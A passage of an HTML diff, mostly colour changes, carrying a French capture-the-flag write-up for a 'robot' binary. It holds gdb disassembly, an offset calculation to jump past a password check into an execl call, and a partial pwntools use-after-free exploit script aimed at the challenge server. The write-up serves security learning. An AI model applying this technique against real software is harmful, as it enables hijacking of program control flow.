+</span></span><span style="display:flex;"><span>   <span style="color:#bd93f9">0x000055a4252b1436</span> <span style="color:#ff79c6">&lt;+</span><span style="color:#bd93f9">95</span><span style="color:#ff79c6">&gt;</span>:	mov    edx,DWORD PTR [rbp<span style="color:#ff79c6">-</span><span style="color:#bd93f9">0x74</span>]
+</span></span><span style="display:flex;"><span>   <span style="color:#bd93f9">0x000055a4252b1439</span> <span style="color:#ff79c6">&lt;+</span><span style="color:#bd93f9">98</span><span style="color:#ff79c6">&gt;</span>:	add    edx,edx
+</span></span><span style="display:flex;"><span>   <span style="color:#bd93f9">0x000055a4252b143b</span> <span style="color:#ff79c6">&lt;+</span><span style="color:#bd93f9">100</span><span style="color:#ff79c6">&gt;</span>:	movsxd rdx,edx
+</span></span><span style="display:flex;"><span>   <span style="color:#bd93f9">0x000055a4252b143e</span> <span style="color:#ff79c6">&lt;+</span><span style="color:#bd93f9">103</span><span style="color:#ff79c6">&gt;</span>:	lea    rcx,[rbp<span style="color:#ff79c6">-</span><span style="color:#bd93f9">0x50</span>]
+</span></span><span style="display:flex;"><span>   <span style="color:#bd93f9">0x000055a4252b1442</span> <span style="color:#ff79c6">&lt;+</span><span style="color:#bd93f9">107</span><span style="color:#ff79c6">&gt;</span>:	add    rcx,rdx
+</span></span><span style="display:flex;"><span>   <span style="color:#bd93f9">0x000055a4252b1445</span> <span style="color:#ff79c6">&lt;+</span><span style="color:#bd93f9">110</span><span style="color:#ff79c6">&gt;</span>:	mov    edx,eax
+</span></span><span style="display:flex;"><span>   <span style="color:#bd93f9">0x000055a4252b1447</span> <span style="color:#ff79c6">&lt;+</span><span style="color:#bd93f9">112</span><span style="color:#ff79c6">&gt;</span>:	lea    rsi,[rip<span style="color:#ff79c6">+</span><span style="color:#bd93f9">0xc5f</span>]        <span style="color:#6272a4"># 0x55a4252b20ad</span>
+</span></span><span style="display:flex;"><span>   <span style="color:#bd93f9">0x000055a4252b144e</span> <span style="color:#ff79c6">&lt;+</span><span style="color:#bd93f9">119</span><span style="color:#ff79c6">&gt;</span>:	mov    rdi,rcx
+</span></span><span style="display:flex;"><span>   <span style="color:#bd93f9">0x000055a4252b1451</span> <span style="color:#ff79c6">&lt;+</span><span style="color:#bd93f9">122</span><span style="color:#ff79c6">&gt;</span>:	mov    eax,<span style="color:#bd93f9">0x0</span>
+</span></span><span style="display:flex;"><span>   <span style="color:#bd93f9">0x000055a4252b1456</span> <span style="color:#ff79c6">&lt;+</span><span style="color:#bd93f9">127</span><span style="color:#ff79c6">&gt;</span>:	call   <span style="color:#bd93f9">0x55a4252b10d0</span> <span style="color:#ff79c6">&lt;</span>sprintf@plt<span style="color:#ff79c6">&gt;</span>
+</span></span><span style="display:flex;"><span>   <span style="color:#bd93f9">0x000055a4252b145b</span> <span style="color:#ff79c6">&lt;+</span><span style="color:#bd93f9">132</span><span style="color:#ff79c6">&gt;</span>:	add    DWORD PTR [rbp<span style="color:#ff79c6">-</span><span style="color:#bd93f9">0x74</span>],<span style="color:#bd93f9">0x1</span>
+</span></span><span style="display:flex;"><span>   <span style="color:#bd93f9">0x000055a4252b145f</span> <span style="color:#ff79c6">&lt;+</span><span style="color:#bd93f9">136</span><span style="color:#ff79c6">&gt;</span>:	cmp    DWORD PTR [rbp<span style="color:#ff79c6">-</span><span style="color:#bd93f9">0x74</span>],<span style="color:#bd93f9">0x1f</span>
+</span></span><span style="display:flex;"><span>   <span style="color:#bd93f9">0x000055a4252b1463</span> <span style="color:#ff79c6">&lt;+</span><span style="color:#bd93f9">140</span><span style="color:#ff79c6">&gt;</span>:	jle    <span style="color:#bd93f9">0x55a4252b1429</span> <span style="color:#ff79c6">&lt;</span>admin<span style="color:#ff79c6">+</span><span style="color:#bd93f9">82</span><span style="color:#ff79c6">&gt;</span>
+</span></span><span style="display:flex;"><span>   <span style="color:#bd93f9">0x000055a4252b1465</span> <span style="color:#ff79c6">&lt;+</span><span style="color:#bd93f9">142</span><span style="color:#ff79c6">&gt;</span>:	lea    rax,[rbp<span style="color:#ff79c6">-</span><span style="color:#bd93f9">0x50</span>]
+</span></span><span style="display:flex;"><span>   <span style="color:#bd93f9">0x000055a4252b1469</span> <span style="color:#ff79c6">&lt;+</span><span style="color:#bd93f9">146</span><span style="color:#ff79c6">&gt;</span>:	lea    rsi,[rip<span style="color:#ff79c6">+</span><span style="color:#bd93f9">0x2bb0</span>]        <span style="color:#6272a4"># 0x55a4252b4020 &lt;encrypted&gt;</span>
+</span></span><span style="display:flex;"><span>   <span style="color:#bd93f9">0x000055a4252b1470</span> <span style="color:#ff79c6">&lt;+</span><span style="color:#bd93f9">153</span><span style="color:#ff79c6">&gt;</span>:	mov    rdi,rax
+</span></span><span style="display:flex;"><span>   <span style="color:#bd93f9">0x000055a4252b1473</span> <span style="color:#ff79c6">&lt;+</span><span style="color:#bd93f9">156</span><span style="color:#ff79c6">&gt;</span>:	call   <span style="color:#bd93f9">0x55a4252b1120</span> <span style="color:#ff79c6">&lt;</span>strcmp@plt<span style="color:#ff79c6">&gt;</span>
+</span></span><span style="display:flex;"><span>   <span style="color:#bd93f9">0x000055a4252b1478</span> <span style="color:#ff79c6">&lt;+</span><span style="color:#bd93f9">161</span><span style="color:#ff79c6">&gt;</span>:	test   eax,eax
+</span></span><span style="display:flex;"><span>   <span style="color:#bd93f9">0x000055a4252b147a</span> <span style="color:#ff79c6">&lt;+</span><span style="color:#bd93f9">163</span><span style="color:#ff79c6">&gt;</span>:	jne    <span style="color:#bd93f9">0x55a4252b14b6</span> <span style="color:#ff79c6">&lt;</span>admin<span style="color:#ff79c6">+</span><span style="color:#bd93f9">223</span><span style="color:#ff79c6">&gt;</span>
+</span></span><span style="display:flex;"><span>   <span style="color:#bd93f9">0x000055a4252b147c</span> <span style="color:#ff79c6">&lt;+</span><span style="color:#bd93f9">165</span><span style="color:#ff79c6">&gt;</span>:	mov    ecx,<span style="color:#bd93f9">0x0</span>
+</span></span><span style="display:flex;"><span>   <span style="color:#bd93f9">0x000055a4252b1481</span> <span style="color:#ff79c6">&lt;+</span><span style="color:#bd93f9">170</span><span style="color:#ff79c6">&gt;</span>:	lea    rdx,[rip<span style="color:#ff79c6">+</span><span style="color:#bd93f9">0xc2a</span>]        <span style="color:#6272a4"># 0x55a4252b20b2</span>
+</span></span><span style="display:flex;"><span>   <span style="color:#bd93f9">0x000055a4252b1488</span> <span style="color:#ff79c6">&lt;+</span><span style="color:#bd93f9">177</span><span style="color:#ff79c6">&gt;</span>:	lea    rsi,[rip<span style="color:#ff79c6">+</span><span style="color:#bd93f9">0xc2c</span>]        <span style="color:#6272a4"># 0x55a4252b20bb</span>
+</span></span><span style="display:flex;"><span>   <span style="color:#bd93f9">0x000055a4252b148f</span> <span style="color:#ff79c6">&lt;+</span><span style="color:#bd93f9">184</span><span style="color:#ff79c6">&gt;</span>:	lea    rdi,[rip<span style="color:#ff79c6">+</span><span style="color:#bd93f9">0xc25</span>]        <span style="color:#6272a4"># 0x55a4252b20bb</span>
+</span></span><span style="display:flex;"><span>   <span style="color:#bd93f9">0x000055a4252b1496</span> <span style="color:#ff79c6">&lt;+</span><span style="color:#bd93f9">191</span><span style="color:#ff79c6">&gt;</span>:	mov    eax,<span style="color:#bd93f9">0x0</span>
+</span></span><span style="display:flex;"><span>   <span style="color:#bd93f9">0x000055a4252b149b</span> <span style="color:#ff79c6">&lt;+</span><span style="color:#bd93f9">196</span><span style="color:#ff79c6">&gt;</span>:	call   <span style="color:#bd93f9">0x55a4252b1070</span> <span style="color:#ff79c6">&lt;</span>execl@plt<span style="color:#ff79c6">&gt;</span>
+</span></span><span style="display:flex;"><span>   <span style="color:#bd93f9">0x000055a4252b14a0</span> <span style="color:#ff79c6">&lt;+</span><span style="color:#bd93f9">201</span><span style="color:#ff79c6">&gt;</span>:	lea    rdi,[rip<span style="color:#ff79c6">+</span><span style="color:#bd93f9">0xc1d</span>]        <span style="color:#6272a4"># 0x55a4252b20c4</span>
+</span></span><span style="display:flex;"><span>   <span style="color:#bd93f9">0x000055a4252b14a7</span> <span style="color:#ff79c6">&lt;+</span><span style="color:#bd93f9">208</span><span style="color:#ff79c6">&gt;</span>:	call   <span style="color:#bd93f9">0x55a4252b1140</span> <span style="color:#ff79c6">&lt;</span>perror@plt<span style="color:#ff79c6">&gt;</span>
+</span></span><span style="display:flex;"><span>   <span style="color:#bd93f9">0x000055a4252b14ac</span> <span style="color:#ff79c6">&lt;+</span><span style="color:#bd93f9">213</span><span style="color:#ff79c6">&gt;</span>:	mov    edi,<span style="color:#bd93f9">0x2</span>
+</span></span><span style="display:flex;"><span>   <span style="color:#bd93f9">0x000055a4252b14b1</span> <span style="color:#ff79c6">&lt;+</span><span style="color:#bd93f9">218</span><span style="color:#ff79c6">&gt;</span>:	call   <span style="color:#bd93f9">0x55a4252b1050</span> <span style="color:#ff79c6">&lt;</span>exit@plt<span style="color:#ff79c6">&gt;</span>
+</span></span><span style="display:flex;"><span>   <span style="color:#bd93f9">0x000055a4252b14b6</span> <span style="color:#ff79c6">&lt;+</span><span style="color:#bd93f9">223</span><span style="color:#ff79c6">&gt;</span>:	lea    rdi,[rip<span style="color:#ff79c6">+</span><span style="color:#bd93f9">0xc0d</span>]        <span style="color:#6272a4"># 0x55a4252b20ca</span>
+</span></span><span style="display:flex;"><span>   <span style="color:#bd93f9">0x000055a4252b14bd</span> <span style="color:#ff79c6">&lt;+</span><span style="color:#bd93f9">230</span><span style="color:#ff79c6">&gt;</span>:	call   <span style="color:#bd93f9">0x55a4252b1040</span> <span style="color:#ff79c6">&lt;</span>puts@plt<span style="color:#ff79c6">&gt;</span>
+</span></span><span style="display:flex;"><span>   <span style="color:#bd93f9">0x000055a4252b14c2</span> <span style="color:#ff79c6">&lt;+</span><span style="color:#bd93f9">235</span><span style="color:#ff79c6">&gt;</span>:	nop
+</span></span><span style="display:flex;"><span>   <span style="color:#bd93f9">0x000055a4252b14c3</span> <span style="color:#ff79c6">&lt;+</span><span style="color:#bd93f9">236</span><span style="color:#ff79c6">&gt;</span>:	mov    rax,QWORD PTR [rbp<span style="color:#ff79c6">-</span><span style="color:#bd93f9">0x8</span>]
+</span></span><span style="display:flex;"><span>   <span style="color:#bd93f9">0x000055a4252b14c7</span> <span style="color:#ff79c6">&lt;+</span><span style="color:#bd93f9">240</span><span style="color:#ff79c6">&gt;</span>:	sub    rax,QWORD PTR fs:<span style="color:#bd93f9">0x28</span>
+</span></span><span style="display:flex;"><span>   <span style="color:#bd93f9">0x000055a4252b14d0</span> <span style="color:#ff79c6">&lt;+</span><span style="color:#bd93f9">249</span><span style="color:#ff79c6">&gt;</span>:	je     <span style="color:#bd93f9">0x55a4252b14d7</span> <span style="color:#ff79c6">&lt;</span>admin<span style="color:#ff79c6">+</span><span style="color:#bd93f9">256</span><span style="color:#ff79c6">&gt;</span>
+</span></span><span style="display:flex;"><span>   <span style="color:#bd93f9">0x000055a4252b14d2</span> <span style="color:#ff79c6">&lt;+</span><span style="color:#bd93f9">251</span><span style="color:#ff79c6">&gt;</span>:	call   <span style="color:#bd93f9">0x55a4252b1110</span> <span style="color:#ff79c6">&lt;</span>__stack_chk_fail@plt<span style="color:#ff79c6">&gt;</span>
+</span></span><span style="display:flex;"><span>   <span style="color:#bd93f9">0x000055a4252b14d7</span> <span style="color:#ff79c6">&lt;+</span><span style="color:#bd93f9">256</span><span style="color:#ff79c6">&gt;</span>:	leave  
+</span></span><span style="display:flex;"><span>   <span style="color:#bd93f9">0x000055a4252b14d8</span> <span style="color:#ff79c6">&lt;+</span><span style="color:#bd93f9">257</span><span style="color:#ff79c6">&gt;</span>:	ret    
+</span></span><span style="display:flex;"><span>End of assembler dump<span style="color:#ff79c6">.</span>
 </span></span></code></pre></div><p>L&rsquo;instruction <code>jne</code> située à <code>+163</code> est une condition, probablement celle qui compare notre input avec le mot de passe, nous voulons donc arriver juste après cette condition, soit à <code>+165</code>. Pour calculer la différence entre les deux, il suffit de prendre l&rsquo;adresse de cette instruction et d&rsquo;y soustraire l&rsquo;adresse de <code>roll</code></p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>print <span style="color:#ae81ff">0x000055a4252b147c</span><span style="color:#f92672">-</span><span style="color:#ae81ff">0x55a4252b12fc</span>
-</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">$</span><span style="color:#ae81ff">5</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">384</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">print</span> <span style="color:#bd93f9">0x000055a4252b147c</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">0x55a4252b12fc</span>
+</span></span><span style="display:flex;"><span>$<span style="color:#bd93f9">5</span> <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">384</span>
 </span></span></code></pre></div><p>Une fois qu&rsquo;on a notre <em>leak</em>, il nous suffit donc d&rsquo;y ajouter <code>384</code> pour trouver l&rsquo;adresse de <code>admin+165</code>.</p>
 <p>Il ne nous reste plus qu&rsquo;à créer un manuel avec <strong>16</strong> chars, puis l&rsquo;adresse de <code>admin+165</code> pour réecrire <code>makeNoise</code> dans la <em>Struct</em> &ldquo;Robot&rdquo;</p>
 <h2 id="tldr">TLDR</h2>
@@ -569,111 +573,111 @@
 </ol>
 <h2 id="exploit">Exploit</h2>
 <p>Et voici donc l&rsquo;exploit final:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/env python3</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#6272a4">#!/usr/bin/env python3</span>
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
-</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> time <span style="color:#f92672">import</span> sleep
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">from</span> pwn <span style="color:#ff79c6">import</span> <span style="color:#ff79c6">*</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">from</span> time <span style="color:#ff79c6">import</span> sleep
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>exe <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#34;./robot&#34;</span>)
+</span></span><span style="display:flex;"><span>exe <span style="color:#ff79c6">=</span> ELF(<span style="color:#f1fa8c">&#34;./robot&#34;</span>)
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>context<span style="color:#f92672">.</span>binary <span style="color:#f92672">=</span> exe
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">conn</span>():
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> args<span style="color:#f92672">.</span>LOCAL:
-</span></span><span style="display:flex;"><span>        r <span style="color:#f92672">=</span> process([exe<span style="color:#f92672">.</span>path])
-</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> args<span style="color:#f92672">.</span>GDB:
-</span></span><span style="display:flex;"><span>            gdb<span style="color:#f92672">.</span>attach(r)
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span>:
-</span></span><span style="display:flex;"><span>        r <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#34;challenges.france-cybersecurity-challenge.fr&#34;</span>, <span style="color:#ae81ff">2101</span>)
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> r
+</span></span><span style="display:flex;"><span>context<span style="color:#ff79c6">.</span>binary <span style="color:#ff79c6">=</span> exe
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">construire</span>(name):
-</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">&#34;construire(&#34;</span><span style="color:#f92672">+</span>str(name)<span style="color:#f92672">+</span><span style="color:#e6db74">&#34;)&#34;</span>)
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">def</span> <span style="color:#50fa7b">conn</span>():
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">if</span> args<span style="color:#ff79c6">.</span>LOCAL:
+</span></span><span style="display:flex;"><span>        r <span style="color:#ff79c6">=</span> process([exe<span style="color:#ff79c6">.</span>path])
+</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">if</span> args<span style="color:#ff79c6">.</span>GDB:
+</span></span><span style="display:flex;"><span>            gdb<span style="color:#ff79c6">.</span>attach(r)
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">else</span>:
+</span></span><span style="display:flex;"><span>        r <span style="color:#ff79c6">=</span> remote(<span style="color:#f1fa8c">&#34;challenges.france-cybersecurity-challenge.fr&#34;</span>, <span style="color:#bd93f9">2101</span>)
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    r<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;1&#39;</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">return</span> r
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    r<span style="color:#f92672">.</span>recv()
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    r<span style="color:#f92672">.</span>sendline(name)
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">def</span> <span style="color:#50fa7b">construire</span>(name):
+</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd;font-style:italic">print</span>(<span style="color:#f1fa8c">&#34;construire(&#34;</span><span style="color:#ff79c6">+</span><span style="color:#8be9fd;font-style:italic">str</span>(name)<span style="color:#ff79c6">+</span><span style="color:#f1fa8c">&#34;)&#34;</span>)
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    r<span style="color:#f92672">.</span>recv()
+</span></span><span style="display:flex;"><span>    r<span style="color:#ff79c6">.</span>sendline(<span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#39;1&#39;</span>)
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">parler</span>():
-</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">&#34;parler()&#34;</span>)
+</span></span><span style="display:flex;"><span>    r<span style="color:#ff79c6">.</span>recv()
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    r<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;2&#39;</span>)
+</span></span><span style="display:flex;"><span>    r<span style="color:#ff79c6">.</span>sendline(name)
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> r<span style="color:#f92672">.</span>recv()
+</span></span><span style="display:flex;"><span>    r<span style="color:#ff79c6">.</span>recv()
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">supprimer</span>():
-</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">&#34;supprimer()&#34;</span>)
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">def</span> <span style="color:#50fa7b">parler</span>():
+</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd;font-style:italic">print</span>(<span style="color:#f1fa8c">&#34;parler()&#34;</span>)
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    r<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;3&#39;</span>)
+</span></span><span style="display:flex;"><span>    r<span style="color:#ff79c6">.</span>sendline(<span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#39;2&#39;</span>)
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    r<span style="color:#f92672">.</span>recv()
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">return</span> r<span style="color:#ff79c6">.</span>recv()
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">mode_emploi</span>(text):
-</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">&#34;mode_emploi(&#34;</span><span style="color:#f92672">+</span>str(text)<span style="color:#f92672">+</span><span style="color:#e6db74">&#34;)&#34;</span>)
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">def</span> <span style="color:#50fa7b">supprimer</span>():
+</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd;font-style:italic">print</span>(<span style="color:#f1fa8c">&#34;supprimer()&#34;</span>)
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    r<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;4&#39;</span>)
+</span></span><span style="display:flex;"><span>    r<span style="color:#ff79c6">.</span>sendline(<span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#39;3&#39;</span>)
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    r<span style="color:#f92672">.</span>recv()
+</span></span><span style="display:flex;"><span>    r<span style="color:#ff79c6">.</span>recv()
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    r<span style="color:#f92672">.</span>sendline(text)
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">def</span> <span style="color:#50fa7b">mode_emploi</span>(text):
+</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd;font-style:italic">print</span>(<span style="color:#f1fa8c">&#34;mode_emploi(&#34;</span><span style="color:#ff79c6">+</span><span style="color:#8be9fd;font-style:italic">str</span>(text)<span style="color:#ff79c6">+</span><span style="color:#f1fa8c">&#34;)&#34;</span>)
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    r<span style="color:#f92672">.</span>recv()
+</span></span><span style="display:flex;"><span>    r<span style="color:#ff79c6">.</span>sendline(<span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#39;4&#39;</span>)
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">manuel</span>():
-</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">&#39;manuel()&#39;</span>)
+</span></span><span style="display:flex;"><span>    r<span style="color:#ff79c6">.</span>recv()
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    r<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;5&#39;</span>)
+</span></span><span style="display:flex;"><span>    r<span style="color:#ff79c6">.</span>sendline(text)
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> r<span style="color:#f92672">.</span>recv()<span style="color:#f92672">.</span>split(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>)[<span style="color:#ae81ff">1</span>]
+</span></span><span style="display:flex;"><span>    r<span style="color:#ff79c6">.</span>recv()
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">main</span>():
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">global</span> r
-</span></span><span style="display:flex;"><span>    r <span style="color:#f92672">=</span> conn()
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">def</span> <span style="color:#50fa7b">manuel</span>():
+</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd;font-style:italic">print</span>(<span style="color:#f1fa8c">&#39;manuel()&#39;</span>)
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># robot = malloc()</span>
-</span></span><span style="display:flex;"><span>    construire(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;A&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">16</span>)
+</span></span><span style="display:flex;"><span>    r<span style="color:#ff79c6">.</span>sendline(<span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#39;5&#39;</span>)
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># free(robot)</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">return</span> r<span style="color:#ff79c6">.</span>recv()<span style="color:#ff79c6">.</span>split(<span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#39;</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#39;</span>)[<span style="color:#bd93f9">1</span>]
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">def</span> <span style="color:#50fa7b">main</span>():
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">global</span> r
+</span></span><span style="display:flex;"><span>    r <span style="color:#ff79c6">=</span> conn()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#6272a4"># robot = malloc()</span>
+</span></span><span style="display:flex;"><span>    construire(<span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#39;A&#39;</span><span style="color:#ff79c6">*</span><span style="color:#bd93f9">16</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#6272a4"># free(robot)</span>
 </span></span><span style="display:flex;"><span>    supprimer()
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># manuel = malloc()</span>
-</span></span><span style="display:flex;"><span>    mode_emploi(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;A&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">16</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#6272a4"># manuel = malloc()</span>
+</span></span><span style="display:flex;"><span>    mode_emploi(<span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#39;A&#39;</span><span style="color:#ff79c6">*</span><span style="color:#bd93f9">16</span>)
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># manuel-&gt;guide</span>
-</span></span><span style="display:flex;"><span>    leak <span style="color:#f92672">=</span> manuel()
+</span></span><span style="display:flex;"><span>    <span style="color:#6272a4"># manuel-&gt;guide</span>
+</span></span><span style="display:flex;"><span>    leak <span style="color:#ff79c6">=</span> manuel()
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    roll <span style="color:#f92672">=</span> u64(leak[leak<span style="color:#f92672">.</span>index(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\xfc</span><span style="color:#e6db74">&#39;</span>):]<span style="color:#f92672">.</span>ljust(<span style="color:#ae81ff">8</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#39;</span>))
+</span></span><span style="display:flex;"><span>    roll <span style="color:#ff79c6">=</span> u64(leak[leak<span style="color:#ff79c6">.</span>index(<span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#39;</span><span style="color:#f1fa8c">\xfc</span><span style="color:#f1fa8c">&#39;</span>):]<span style="color:#ff79c6">.</span>ljust(<span style="color:#bd93f9">8</span>, <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#39;</span><span style="color:#f1fa8c">\x00</span><span style="color:#f1fa8c">&#39;</span>))
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">&#34;roll @&#34;</span>, hex(roll))
+</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd;font-style:italic">print</span>(<span style="color:#f1fa8c">&#34;roll @&#34;</span>, <span style="color:#8be9fd;font-style:italic">hex</span>(roll))
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    flag <span style="color:#f92672">=</span> roll <span style="color:#f92672">+</span> <span style="color:#ae81ff">384</span>
+</span></span><span style="display:flex;"><span>    flag <span style="color:#ff79c6">=</span> roll <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">384</span>
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">&#34;flag @&#34;</span>, hex(flag))
+</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd;font-style:italic">print</span>(<span style="color:#f1fa8c">&#34;flag @&#34;</span>, <span style="color:#8be9fd;font-style:italic">hex</span>(flag))
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># robot = malloc()</span>
-</span></span><span style="display:flex;"><span>    construire(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;A&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">16</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#6272a4"># robot = malloc()</span>
+</span></span><span style="display:flex;"><span>    construire(<span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#39;A&#39;</span><span style="color:#ff79c6">*</span><span style="color:#bd93f9">16</span>)
 </span></span><span style="display:flex;"><span>
